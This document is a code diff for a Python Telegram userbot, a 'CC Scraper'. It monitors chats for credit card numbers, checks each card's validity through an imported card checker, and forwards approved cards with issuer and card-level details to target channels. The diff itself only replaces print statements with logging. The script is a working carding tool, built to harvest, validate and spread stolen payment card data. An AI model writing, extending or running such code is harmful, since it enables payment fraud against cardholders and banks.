@@ -1,8 +1,12 @@
 import re  
 import asyncio  
+import logging  
 from telethon import TelegramClient, events  
 from telethon.sessions import StringSession  
 from cc_checker import check_cc  
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # API Configuration  
 api_id = 25031007  # Replace with your actual API ID
@@ -84,9 +88,11 @@ async def cc_scraper(event):
   
     if found_ccs:  
         for cc in found_ccs:  
+            logging.info(f"Checking credit card: {cc}")
             # Check the credit card validity
             result = await check_cc(cc)
             if result['status'] == 'approved':
+                logging.info(f"Credit card approved: {cc}")
                 # Format the message as in b3.py
                 card_info = f"{result['card_type']} - {result['card_level']} - {result['card_type_category']}"
                 issuer = result['issuer']
@@ -107,26 +113,29 @@ async def cc_scraper(event):
                     for channel_id in target_channels:
                         try:
                             await client.send_message(channel_id, message, parse_mode="HTML")
+                            logging.info(f"Message sent to channel {channel_id}")
                         except Exception as e:
-                            print(f"Error sending to channel {channel_id}: {str(e)}")
+                            logging.error(f"Error sending to channel {channel_id}: {str(e)}")
                 else:
-                    print(f"Approved CC: {cc}")
+                    logging.info(f"Approved CC: {cc}")
+            else:
+                logging.info(f"Credit card declined: {cc}")
 
 # Run Client  
 async def main():  
     await client.start()  
-    print("✅ CC Scraper Running...")
+    logging.info("✅ CC Scraper Running...")
     
     sources = get_sources()
     if sources:
-        print(f"✅ Monitoring {len(sources)} source(s)")
+        logging.info(f"✅ Monitoring {len(sources)} source(s)")
     else:
-        print("⚠️ No sources specified. Will monitor all chats the account has access to.")
+        logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
     
     if target_channels:
-        print(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
+        logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
     else:
-        print("⚠️ No target channels specified. Found CCs will be printed to console only.")
+        logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
         
     await client.run_until_disconnected()  
 
